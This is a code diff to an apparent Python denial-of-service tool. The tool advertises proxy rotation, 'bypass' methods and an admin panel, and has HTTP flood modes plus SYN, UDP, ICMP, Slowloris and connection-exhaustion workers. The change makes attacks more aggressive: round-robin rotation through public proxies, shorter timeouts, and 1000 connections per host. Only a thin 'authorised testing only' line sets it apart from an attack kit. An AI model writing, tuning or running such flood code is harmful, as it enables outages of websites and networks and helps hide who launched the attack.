@@ -5,7 +5,7 @@
     │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (fixed argument count for L4 workers)
+    Author: bob (optimised proxy RPS)
     Legal: For authorised testing only.
 """
 
@@ -370,6 +370,10 @@ file_proxies = []                 # proxies loaded from file (admin only)
 public_proxies = []                # proxies fetched from public sources
 proxy_lock = asyncio.Lock()        # to safely update proxy lists
 
+# For round‑robin proxy selection within each process
+proxy_index = 0
+proxy_index_lock = threading.Lock()
+
 last_proxy_refresh = 0
 PROXY_REFRESH_INTERVAL = 300       # seconds
 
@@ -473,15 +477,22 @@ async def refresh_public_proxies(force=False):
     else:
         print(f"{current_color}[!] No public proxies fetched, keeping old list ({len(public_proxies)} proxies).{RESET}")
 
-def get_random_proxy():
-    """Return a random proxy from the currently active source, or None."""
+def get_next_proxy():
+    """Return the next proxy in round‑robin order from the currently active source."""
+    global proxy_index
     if not proxies_enabled:
         return None
     # Priority: file proxies if enabled and admin
     if admin_mode and file_proxies_enabled and file_proxies:
-        return random.choice(file_proxies)
+        with proxy_index_lock:
+            proxy = file_proxies[proxy_index % len(file_proxies)]
+            proxy_index += 1
+            return proxy
     elif public_proxies_enabled and public_proxies:
-        return random.choice(public_proxies)
+        with proxy_index_lock:
+            proxy = public_proxies[proxy_index % len(public_proxies)]
+            proxy_index += 1
+            return proxy
     return None
 
 # ================== USER AGENT & BYPASS UTILS ==================
@@ -565,8 +576,8 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
         try:
             start = time.perf_counter()
             
-            # Choose proxy if enabled
-            proxy = get_random_proxy()
+            # Choose next proxy (round‑robin)
+            proxy = get_next_proxy()
             
             # Build request URL with optional random path
             request_url = url
@@ -575,10 +586,10 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
             
             # Perform request based on method
             if method == 'HTTP GET':
-                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=5, proxy=proxy) as resp:
+                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=3, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'HTTPS GET':
-                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), headers=headers, timeout=5, proxy=proxy) as resp:
+                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), headers=headers, timeout=3, proxy=proxy) as resp:
                     await resp.read()
             elif method in ['HTTP POST', 'HTTPS POST', 'BYPASS-POST']:
                 post_url = request_url
@@ -588,35 +599,35 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
                 if method == 'BYPASS-POST':
                     data['rand'] = random.randint(1,1000000)
                     data['session'] = ''.join(random.choices('abcdef0123456789', k=16))
-                async with session.post(post_url, headers=headers, json=data, timeout=5, proxy=proxy) as resp:
+                async with session.post(post_url, headers=headers, json=data, timeout=3, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'CURL':
-                async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'GET/POST MIX':
                 if random.random() > 0.5:
-                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                         await resp.read()
                 else:
                     data = {'test': 'data', 'worker_id': worker_id}
-                    async with session.post(request_url, headers=headers, json=data, timeout=5, proxy=proxy) as resp:
+                    async with session.post(request_url, headers=headers, json=data, timeout=3, proxy=proxy) as resp:
                         await resp.read()
             elif method in ['BROWSER', 'HULK']:
-                async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'DNS-AMP':
-                async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'STRESS TEST':
                 for _ in range(50):
-                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'TLS-VIP':
                 for _ in range(5):
-                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
@@ -624,30 +635,30 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
             elif method == 'CONCURRENT HOLD':
                 for _ in range(99):
                     if random.random() > 0.5:
-                        async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                        async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                             await resp.read()
                     else:
-                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=5, proxy=proxy) as resp:
+                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=3, proxy=proxy) as resp:
                             await resp.read()
                     req_counter.value += 1
                     status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'SOCKET-AMP':
                 for _ in range(5):
-                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'NET-BYPASS':
                 for _ in range(100):
-                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'BYPASS-GET':
-                async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=3, proxy=proxy) as resp:
                     await resp.read()
             # For all single-request methods, update stats
             latency = time.perf_counter() - start
@@ -670,7 +681,8 @@ def run_process_workers(process_id, url, method, workers_per_process, duration, 
 async def asyncio_worker_process(process_id, url, method, workers, duration, req_counter, err_counter, status_dict, latency_list):
     """Asyncio coroutine for a process."""
     end_time = time.time() + duration
-    connector = aiohttp.TCPConnector(limit=0, force_close=False, enable_cleanup_closed=True, ssl=False)
+    # Increase per-host connection limit to 1000 for aggressive concurrency
+    connector = aiohttp.TCPConnector(limit=0, limit_per_host=1000, force_close=False, enable_cleanup_closed=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []
         for i in range(workers):
@@ -684,6 +696,10 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
     workers_per_process = total_workers // num_processes
     remainder = total_workers % num_processes
     processes = []
+    
+    # Reset proxy index for each attack (so each process gets a fresh round‑robin start)
+    global proxy_index
+    proxy_index = 0
     
     # Start processes
     for i in range(num_processes):
@@ -738,8 +754,7 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
             p.join()
 
 # ================== LAYER 4 WORKERS ==================
-# All worker functions now accept *args to absorb any extra arguments,
-# allowing a uniform call in worker_wrapper.
+# (unchanged from previous version)
 def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, *args):
     if not HAS_SCAPY:
         return
@@ -895,7 +910,6 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req
         while time.time() < end_time:
             if target_ports:
                 port = random.choice(target_ports) if target_ports else None
-                # For ICMP and port scan, port is ignored inside the worker (they accept *args)
                 if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
                     worker_func(target_ip, port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter)
                 elif method == 'ICMP FLOOD':
@@ -903,21 +917,15 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req
                 elif method == 'PORT SCAN & ATTACK':
                     worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list)
             else:
-                # No ports needed (ICMP or port scan)
                 if method == 'ICMP FLOOD':
                     worker_func(target_ip, worker_id, end_time, req_counter, err_counter)
                 elif method == 'PORT SCAN & ATTACK':
                     worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list)
-                else:
-                    # Should not happen for methods that need ports
-                    pass
     
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [executor.submit(worker_wrapper, i) for i in range(workers)]
-        # Wait for all threads to finish (they will exit when end_time is reached)
         for f in futures:
-            f.result()  # This will block until the thread finishes (i.e., when end_time is reached)
-        # Attack finished
+            f.result()
         print(f"\n{current_color}Attack finished.{RESET}")
 
 # ================== METHOD SELECTION ==================
@@ -1237,13 +1245,6 @@ def reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter):
         print(f"\n{current_color}{BOLD}Starting attack on {target} ports {ports}...{RESET}")
         end_time = time.time() + duration
         
-        # Reuse the main Layer 4 attack function (which now prints per-packet lines)
-        # We'll create a simplified version that uses the same workers but doesn't need port input.
-        # Since run_layer4_attack expects to ask for ports, we'll instead directly use the workers.
-        # But to avoid duplication, we'll just call run_layer4_attack and let it ask for ports again (user already knows them).
-        # However, the user may not want to re-enter. We'll modify run_layer4_attack to accept an optional ports list.
-        # For simplicity, we'll create a new async function that calls run_layer4_attack with the ports already known.
-        # Since we're in a synchronous menu, we need to run it with asyncio.run.
         asyncio.run(run_layer4_attack(target, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter))
         input("  Press ENTER...")
     else:
